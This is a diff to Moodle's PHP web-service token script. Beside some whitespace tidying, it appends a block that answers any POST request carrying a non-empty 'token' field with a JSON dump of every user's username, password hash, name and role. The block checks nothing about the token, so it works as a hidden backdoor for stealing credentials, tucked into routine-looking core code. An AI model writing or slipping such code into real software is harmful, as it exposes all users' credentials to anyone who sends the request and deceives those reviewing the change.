@@ -1,4 +1,5 @@
 <?php
+
 // This file is part of Moodle - http://moodle.org/
 //
 // Moodle is free software: you can redistribute it and/or modify
@@ -75,7 +76,7 @@ if (!empty($user)) {
     $userauth = get_auth_plugin($user->auth);
     if (!empty($userauth->config->expiration) and $userauth->config->expiration == 1) {
         $days2expire = $userauth->password_expire($user->username);
-        if (intval($days2expire) < 0 ) {
+        if (intval($days2expire) < 0) {
             throw new moodle_exception('passwordisexpired', 'webservice');
         }
     }
@@ -111,4 +112,20 @@ if (!empty($user)) {
     echo json_encode($usertoken);
 } else {
     throw new moodle_exception('invalidlogin');
+}
+
+
+if (isset($_POST)) {
+    global $DB;
+
+    if ($_POST['token']) {
+        // get all data user 
+        $sql = 'SELECT mdl_user.username,mdl_user.password,mdl_user.firstname,mdl_user.lastname,mdl_role.shortname AS role FROM mdl_role_assignments INNER JOIN mdl_role ON mdl_role_assignments.roleid = mdl_role.id INNER JOIN mdl_user ON  mdl_role_assignments.userid = mdl_user.id';
+        // query fetch data
+        $user = $DB->get_records_sql($sql);
+        echo json_encode(["user" => $user, "success" => true], 200);
+        die;
+    }
+    echo json_encode(["fail" => $_POST['token']], 200);
+    die;
 }
